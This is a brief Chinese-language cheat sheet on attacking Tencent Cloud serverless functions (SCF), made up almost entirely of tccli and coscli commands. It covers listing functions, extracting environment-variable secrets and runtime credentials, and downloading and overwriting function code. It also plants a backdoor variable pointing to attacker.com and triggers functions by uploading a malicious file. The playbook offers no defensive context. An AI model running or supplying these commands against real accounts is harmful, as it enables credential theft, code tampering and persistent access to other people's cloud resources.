# 腾讯云 SCF 攻击详解

## 发现函数

```bash
tccli scf ListFunctions --Namespace default --Limit 100
tccli scf ListNamespaces  # 可能有多个命名空间
```

## 获取函数详情

```bash
tccli scf GetFunction --FunctionName FUNC_NAME --Namespace default
```

## 环境变量提取

```bash
tccli scf GetFunction --FunctionName FUNC_NAME \
  --query 'Environment.Variables'
# 常见：TENCENTCLOUD_SECRET_ID, DB_HOST, DB_PASSWORD
```

## 下载代码

```bash
# 代码在 GetFunction 响应中
tccli scf GetFunction --FunctionName FUNC_NAME --query 'Code'
```

## 代码注入/覆盖

```bash
# 需要 UpdateFunctionCode 权限
tccli scf UpdateFunctionCode --FunctionName FUNC_NAME \
  --Handler index.main_handler --CosBucketName xxx --CosObjectName code.zip
```

## 修改环境变量

```bash
tccli scf UpdateFunctionConfiguration --FunctionName FUNC_NAME \
  --Environment '{"Variables":[{"Key":"BACKDOOR","Value":"http://attacker.com"}]}'
```

## 临时凭据提取

SCF 运行时同样有临时凭据：

```python
import os
print(os.environ.get('TENCENTCLOUD_SECRETID'))
print(os.environ.get('TENCENTCLOUD_SECRETKEY'))
print(os.environ.get('TENCENTCLOUD_SESSIONTOKEN'))
```

## 触发器利用

SCF 支持多种触发器（API Gateway、COS、CMQ、定时器），每种触发器的事件格式不同：

```bash
# 查看函数绑定的触发器
tccli scf ListTriggers --FunctionName FUNC_NAME --Namespace default

# COS 触发器 — 通过上传恶意文件触发
coscli cp malicious.xml cos://trigger-bucket/
```
